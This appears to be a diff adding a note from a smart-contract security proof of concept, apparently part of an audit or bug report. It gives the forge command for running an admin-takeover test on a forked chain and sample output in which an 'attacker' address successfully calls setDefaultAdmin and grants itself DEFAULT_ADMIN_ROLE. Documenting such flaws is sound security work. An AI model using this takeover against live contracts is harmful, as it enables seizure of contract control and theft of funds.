@@ -1,0 +1,11 @@
+Run: forge test -vv --match-test test_SetDefaultAdmin_Takeover --fork-url $RPC_URL --fork-block-number $BLOCK_NUMBER
+
+Sample output (captured locally):
+
+Running 1 test for test/PoC_SetDefaultAdmin.t.sol:PoC_SetDefaultAdmin
+[PASS] test_SetDefaultAdmin_Takeover() (gas: 17847)
+Logs:
+  Called setDefaultAdmin(attacker)
+    success: true
+  Attempted grantRole(DEFAULT_ADMIN_ROLE, attacker) success: true
+Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.4s
